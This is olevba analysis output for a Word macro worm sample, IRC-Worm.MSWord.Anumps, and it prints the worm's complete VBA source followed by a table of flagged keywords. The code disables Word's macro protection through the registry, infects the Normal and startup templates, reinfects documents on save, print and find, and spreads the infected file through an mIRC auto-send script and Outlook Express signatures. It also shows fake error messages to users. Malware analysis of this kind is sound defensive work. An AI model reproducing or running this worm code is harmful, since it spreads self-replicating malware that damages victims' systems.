olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: IRC-Worm.MSWord.Anumps-1e75d82fae790f93ceb093a79771a9ee94a22a32
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: IRC-Worm.MSWord.Anumps-1e75d82fae790f93ceb093a79771a9ee94a22a32 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Mumps.bas 
in file: IRC-Worm.MSWord.Anumps-1e75d82fae790f93ceb093a79771a9ee94a22a32 - OLE stream: 'Macros/VBA/Mumps'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Mumps
Sub HelpAbout()
    On Error Resume Next
    Options.BlueScreen = True
    MyAPP = Shell("notepad.exe", 1)
    SendKeys "Windows has low memory resources. Please restart your Windows.....", True
    AppActivate (MyAPP)
End Sub
Sub AutoClose()
    On Error Resume Next
    ' Mumps by Anonymous 01/02
    Dim f1, t1, fs
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Application.DisplayStatusBar = False
    Set fso = CreateObject("Scripting.FileSystemObject")
    Application.ScreenUpdating = False
    Options.SaveNormalPrompt = False
    Application.DisplayAlerts = wdAlertsNone
    ActiveDocument.ReadOnlyRecommended = False
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Anonymous"
    ActiveDocument.VBProject.VBComponents("Mumps").export ("C:\Windows\Mumps.drv")
    SetAttr ("C:\Windows\Mumps.drv"), 6
    Template = Dir("C:\Program Files\Microsoft Office\Office\STARTUP\Mumps.dot")
    If Template = "" Then
    NormalTemplate.OpenAsDocument
    ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\Mumps.drv")
    ActiveDocument.SaveAs ("C:\Program Files\Microsoft Office\Office\STARTUP\Mumps.dot")
    ActiveDocument.SaveAs ("C:\Windows\FAQ.doc")
    NormalTemplate.Saved = True
    ActiveDocument.Close
    End If
    Call MIRC
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Identities\{4A2A00A0-C0FA-11D3-A16B-921B092BE65E}\Software\Microsoft\Outlook Express\5.0\signatures", "Default Signature") = "00000000"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Identities\{4A2A00A0-C0FA-11D3-A16B-921B092BE65E}\Software\Microsoft\Outlook Express\5.0\signatures\00000000", "name") = "Signature #1"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Identities\{4A2A00A0-C0FA-11D3-A16B-921B092BE65E}\Software\Microsoft\Outlook Express\5.0\signatures\00000000", "type") = "2"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Identities\{4A2A00A0-C0FA-11D3-A16B-921B092BE65E}\Software\Microsoft\Outlook Express\5.0\signatures\00000000", "text") = ""
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Identities\{4A2A00A0-C0FA-11D3-A16B-921B092BE65E}\Software\Microsoft\Outlook Express\5.0\signatures\00000000", "file") = "C:\WINDOWS\FAQ.doc"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Identities\{4A2A00A0-C0FA-11D3-A16B-921B092BE65E}\Software\Microsoft\Outlook Express\5.0", "Signature Flags") = "3"
End Sub
Sub AutoOpen()
    On Error Resume Next
    ' Mumps by Anonymous 01/02
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Application.DisplayStatusBar = False
    Application.ScreenUpdating = False
    Options.SaveNormalPrompt = False
    Application.DisplayAlerts = wdAlertsNone
    ActiveDocument.ReadOnlyRecommended = False
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Anonymous"
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Identities\{4A2A00A0-C0FA-11D3-A16B-921B092BE65E}\Software\Microsoft\Outlook Express\5.0\signatures", "Default Signature") = "00000000"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Identities\{4A2A00A0-C0FA-11D3-A16B-921B092BE65E}\Software\Microsoft\Outlook Express\5.0\signatures\00000000", "name") = "Signature #1"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Identities\{4A2A00A0-C0FA-11D3-A16B-921B092BE65E}\Software\Microsoft\Outlook Express\5.0\signatures\00000000", "type") = "2"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Identities\{4A2A00A0-C0FA-11D3-A16B-921B092BE65E}\Software\Microsoft\Outlook Express\5.0\signatures\00000000", "text") = ""
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Identities\{4A2A00A0-C0FA-11D3-A16B-921B092BE65E}\Software\Microsoft\Outlook Express\5.0\signatures\00000000", "file") = "C:\WINDOWS\FAQ.doc"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Identities\{4A2A00A0-C0FA-11D3-A16B-921B092BE65E}\Software\Microsoft\Outlook Express\5.0", "Signature Flags") = "3"
   
    ActiveDocument.VBProject.VBComponents("Mumps").export ("C:\Windows\Mumps.drv")
    SetAttr ("C:\Windows\Mumps.drv"), 6
    Template = Dir("C:\Program Files\Microsoft Office\Office\STARTUP\Mumps.dot")
    If Template = "" Then
    NormalTemplate.OpenAsDocument
    ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\Mumps.drv")
    ActiveDocument.SaveAs ("C:\Program Files\Microsoft Office\Office\STARTUP\Mumps.dot")
    ActiveDocument.SaveAs ("C:\Windows\FAQ.doc")
    NormalTemplate.Saved = True
    ActiveDocument.Close
    End If
    Call MIRC
End Sub
Sub SpreadTheWord()
    On Error Resume Next
    If ActiveDocument.VBProject.VBComponents.Item("Mumps").CodeModule.Lines(1, 1) <> "' Mumps" Then
    ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\Mumps.drv")
    ActiveDocument.Save
    End If
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call SpreadTheWord
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Dialogs(wdDialogFileSaveAs).Show
    Call SpreadTheWord
End Sub
Sub FileSave()
    On Error Resume Next
    Call SpreadTheWord
    ActiveDocument.Save
End Sub
Sub FilePrintDefault()
    On Error Resume Next
    Call SpreadTheWord
    If Second(Now) = 59 Then Selection.TypeText "Your printer driver is not compatible with Windows. Please install another printer drivers."
End Sub
Sub FilePrint()
    On Error Resume Next
    Call SpreadTheWord
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub ToolsOptions()
    On Error Resume Next
    Options.VirusProtection = 1
    Options.SaveNormalPrompt = 1
    Dialogs(wdDialogToolsOptions).Show
    Options.VirusProtection = 0
    Options.SaveNormalPrompt = 0
    Call SpreadTheWord
End Sub
Sub EditFind()
    On Error Resume Next
    Call SpreadTheWord
    Dialogs(wdDialogEditFind).Show
End Sub
Sub MIRC()
  On Error Resume Next
  Set fso = CreateObject("Scripting.FileSystemObject")
  Set scriptini = fso.CreateTextFile("c:\mirc\script.ini")
  scriptini.writeline "[script]"
  scriptini.writeline "n0=on 1:JOIN:#:{"
  scriptini.writeline "n1= /if ( $nick == $me ) { halt }"
  scriptini.writeline "n2= /.dcc send $nick " & "c:\Windows\FAQ.doc"
  scriptini.writeline "n3=}"
  scriptini.writeline "n4=on 1:PART:#:{"
  scriptini.writeline "n5= /if ( $nick == $me ) { halt }"
  scriptini.writeline "n6= /.dcc send $nick " & "c:\Windows\FAQ.doc"
  scriptini.writeline "n7=}"
  scriptini.Close
End Sub
Sub ViewVBCode()
    Call SpreadTheWord
    MsgBox "There is something a trouble with this function..."
End Sub
Sub ToolsMacro()
   Call SpreadTheWord
   MsgBox "There is something a trouble with this function..."
End Sub
Sub FileTemplates()
   Call SpreadTheWord
   MsgBox "There is something a trouble with this function..."
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|AppActivate         |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |notepad.exe         |Executable file name                         |
|Base64    |~)^                 |file                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

